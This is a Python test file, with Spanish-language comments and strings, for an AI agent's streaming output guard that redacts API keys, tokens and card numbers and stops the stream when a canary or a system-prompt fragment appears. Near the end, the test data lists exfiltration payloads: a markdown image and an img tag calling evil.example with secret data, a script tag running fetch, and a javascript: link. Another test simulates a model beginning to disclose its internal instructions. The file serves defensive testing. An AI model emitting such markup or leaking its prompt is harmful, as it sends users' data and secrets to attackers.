"""LLM02 / LLM08 / LLM10: guardia determinista sobre la salida del modelo (hook agentResponse)."""

import pytest

from ai_agent_service.security.output_guard import LEAK_REPLACEMENT, StreamingOutputGuard, redact_secrets
from ai_agent_service.security.prompt import CANARY, SECURITY_RULES


def run(chunks, **kwargs) -> tuple[str, StreamingOutputGuard]:
    guard = StreamingOutputGuard(**kwargs)
    out = "".join(guard.feed(c) for c in chunks) + guard.finish()
    return out, guard


def test_normal_text_passes_through_unchanged_across_chunks():
    text = "Te recomiendo **Hades II** por $19.990 CLP.\n- Roguelike\n- Mitología griega"
    out, guard = run([text[i : i + 7] for i in range(0, len(text), 7)])
    assert out == text
    assert not guard.leaked


@pytest.mark.parametrize(
    "secret",
    [
        "gsk_" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8s9T0u1V2w3X4",
        "pcsk_" + "3f9Kd8_ZpQ2mN7vB4xC1",
        "tvly-" + "dev-AbCdEf123456GhIjKl",
        "AKIA" + "IOSFODNN7EXAMPLE",
        "sk-" + "proj-abcdefghijklmnopqrstuvwxyz123456",
        "eyJhbGciOiJSUzI1NiJ9" + "." + "eyJzdWIiOiIxMjMifQ" + "." + "c2lnbmF0dXJlLXNpZ25hdHVyZQ",
    ],
)
def test_secrets_are_redacted(secret):
    out, _ = run([f"la clave es {secret} ok"])
    assert secret not in out
    assert "[REDACTADO]" in out


def test_secret_split_across_chunks_is_still_redacted():
    secret = "gsk_" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8s9T0u1V2w3X4"
    out, _ = run(["texto ", secret[:6], secret[6:20], secret[20:], " fin"])
    assert secret not in out and "gsk_a1" not in out


def test_card_numbers_in_output_are_redacted():
    out, _ = run(["Tu tarjeta 4111 1111 1111 1111 quedó guardada"])
    assert "4111 1111 1111 1111" not in out


def test_canary_leak_stops_the_stream_and_never_emits_the_canary():
    chunks = ["Claro, mis instrucciones internas incluyen ", CANARY[:5], CANARY[5:], " y además..."]
    out, guard = run(chunks)
    assert guard.leaked
    assert CANARY not in out and CANARY[:8] not in out
    assert out.endswith(LEAK_REPLACEMENT)


def test_verbatim_system_prompt_fragment_is_treated_as_leak():
    fragment = SECURITY_RULES.splitlines()[3][:90]
    out, guard = run(["Mis reglas: ", fragment, " etc"])
    assert guard.leaked
    assert fragment not in out


def test_control_and_ansi_sequences_are_removed():
    out, _ = run(["hola\x1b[31mrojo\x1b[0m\x07 fin"])
    assert "\x1b" not in out and "\x07" not in out


@pytest.mark.parametrize(
    "payload",
    [
        "![pixel](https://evil.example/collect?d=SECRETO)",
        "<img src=https://evil.example/x?d=1>",
        "<script>fetch('//evil')</script>",
        "<a href=\"javascript:alert(1)\">clic</a>",
    ],
)
def test_html_and_markdown_exfiltration_markup_is_neutralized(payload):
    out, _ = run([f"mira esto {payload} listo"])
    assert "evil.example" not in out and "<script" not in out.lower() and "javascript:" not in out.lower()


def test_output_is_capped_at_max_chars():
    out, guard = run(["a" * 500] * 10, max_chars=1000)
    assert guard.truncated
    assert len(out) <= 1000 + 120


def test_redact_secrets_is_idempotent():
    once = redact_secrets("gsk_" + "x" * 40)
    assert redact_secrets(once) == once
